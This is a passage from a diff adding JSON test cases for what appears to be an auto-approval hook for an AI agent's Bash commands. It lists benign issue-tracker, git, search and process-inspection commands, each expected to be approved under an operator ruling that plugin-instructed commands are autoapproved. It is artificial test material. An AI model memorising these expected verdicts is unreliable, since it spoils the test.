+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_show_pg2_abc12_json_include_comments_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd show pg2-abc12 --json --include-comments" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_show_pg2_abc12_json_jq_r_if_type_object_and_has_data_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd show pg2-abc12 --json | jq -r '(if type==\"object\" and has(\"data\") then .data else . end)[0].notes // \"\"' | rg -o 'Promoted P[0-9]->P[0-9]' | tail -1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_list_desc_contains_artifact_status_all_n_0_json_jq_r_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --desc-contains \"artifact\" --status all -n 0 --json | jq -r '(if type==\"object\" and has(\"data\") then .data else . end)[] | \"== \\(.id) ==\"' | rg -in 'operator ruled|superseded'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_create_title_deps_discovered_from_pg2_abc12_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"title\" --deps \"discovered-from:pg2-abc12\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_version_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd version" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_merge_base_is_ancestor_abc1234_main_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git merge-base --is-ancestor abc1234 main" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_fetch_quiet_origin_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git fetch --quiet origin" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_branch_r_contains_abc1234_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git branch -r --contains abc1234" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_cherry_v_main_feature_x_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git cherry -v main feature-x" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_ls_tree_r_name_only_main_docs_plan_md_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git ls-tree -r --name-only main -- docs/plan.md"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_grep_c_symbol_main_packages_foo_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "git grep -c -- 'symbol' main -- packages/foo"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_git_range_diff_main_old_main_new_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "git range-diff main..old main..new" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_fd_hi_artifact_repo_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "fd -HI artifact /repo" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_rg_uu_in_operator_ruled_superseded_g_artifact_repo_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "rg -uu -in 'operator ruled|superseded' -g '*artifact*' /repo"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_handoff_create_unattended_session_id_sess_1_title_subjec_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "handoff-create --unattended --session-id sess-1 --title \"subject\" --body-file /tmp/body.md --label auto-session-wrapped"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_handoff_create_attended_session_id_sess_1_title_subject_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "handoff-create --attended --session-id sess-1 --title \"subject\" --body-file /tmp/body.md"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_comment_pg2_abc12_absorbed_item_pg2_def34_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd comment pg2-abc12 \"ABSORBED: item => pg2-def34\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_close_pg2_abc12_reason_handoff_absorbed_actor_sess_1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd close pg2-abc12 --reason \"handoff absorbed\" --actor sess-1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_lifecycle_bd_show_pg2_abc12_json_jq_r_if_type_object_and_has_data_approve_2",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-lifecycle"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd show pg2-abc12 --json | jq -r '(if type==\"object\" and has(\"data\") then .data else . end) | .[0] | \"\\(.issue_type)\\t\\(.metadata.handed_off_from_session // \"\")\"'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-lifecycle plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_bd_dolt_show_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dolt show" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_bd_dolt_status_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dolt status" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_bd_dolt_test_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dolt test" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_bd_stats_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd stats" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_du_sh_beads_dolt_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "du -sh ./.beads/dolt" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_ps_axo_pid_ppid_lstart_command_grep_d_olt_sql_server_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "ps -axo pid,ppid,lstart,command | grep '[d]olt sql-server'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_ps_p_123_o_command_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "ps -p 123 -o command=" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_lsof_np_itcp_25252_grep_listen_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "lsof -nP -iTCP:25252 | grep LISTEN" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_beads_dolt_doctor_launchctl_list_org_nixos_beads_dolt_server_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "beads-dolt-doctor"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "launchctl list org.nixos.beads-dolt-server" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the beads-dolt-doctor plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_list_label_docket_status_all_n_0_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --label docket --status all -n 0 --json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_label_remove_pg2_abc12_docket_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd label remove pg2-abc12 docket" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_dep_list_pg2_trig1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dep list pg2-trig1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_list_parent_pg2_up1_status_closed_n_0_json_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd list --parent pg2-up1 --status closed -n 0 --json"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_phase1_design_file_tmp_design_md_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-phase1 --design-file /tmp/design.md"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_create_title_t_task_labels_human_d_body_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"title\" -t task --labels human -d \"body\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_dep_add_pg2_trig1_blocked_by_pg2_esc1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd dep add pg2-trig1 --blocked-by pg2-esc1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_show_pg2_packet1_json_jq_c_data_0_metadata_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd show pg2-packet1 --json | jq -c '.data[0].metadata'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_defer_pg2_packet1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd defer pg2-packet1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_undefer_pg2_packet1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd undefer pg2-packet1" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_create_title_t_epic_parent_pg2_prog1_no_inherit_label_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"title\" -t epic --parent pg2-prog1 --no-inherit-labels --label docket,phase --design-file /tmp/slice.md --metadata '{\"pd_phase\":\"x\"}'"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_create_title_t_task_parent_pg2_prog1_no_inherit_label_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd create \"title\" -t task --parent pg2-prog1 --no-inherit-labels --label phase-trigger -p 2 -d \"Run phase-decompose\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_dep_add_pg2_phase1_blocked_by_pg2_trig1_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd dep add pg2-phase1 --blocked-by pg2-trig1"
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_trig1_append_notes_placeholder_note_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": {
+        "command": "bd update pg2-trig1 --append-notes \"placeholder note\""
+      }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_update_pg2_trig1_priority_2_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd update pg2-trig1 --priority 2" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
+    "notes": "pg2-cjfpy.2: a command form the plan-decompose plugin instructs an agent to run (placeholders literalized). Operator ruling (Phillip, 2026-10-04, parent epic pg2-cjfpy): any command a skill instructs is autoapproved."
+  },
+  {
+    "case": "plugin_plan_decompose_bd_comment_pg2_trig1_text_approve",
+    "tags": ["plugin-instructed", "cjfpy2", "plan-decompose"],
+    "tool_input": {
+      "tool_name": "Bash",
+      "tool_input": { "command": "bd comment pg2-trig1 \"text\"" }
+    },
+    "cwd_path_state": { "cwd": "/repo", "project_root": "/repo" },
+    "mode": "default",
+    "settings": {},
+    "rules_config": {},
+    "expected_verdict": "approve",
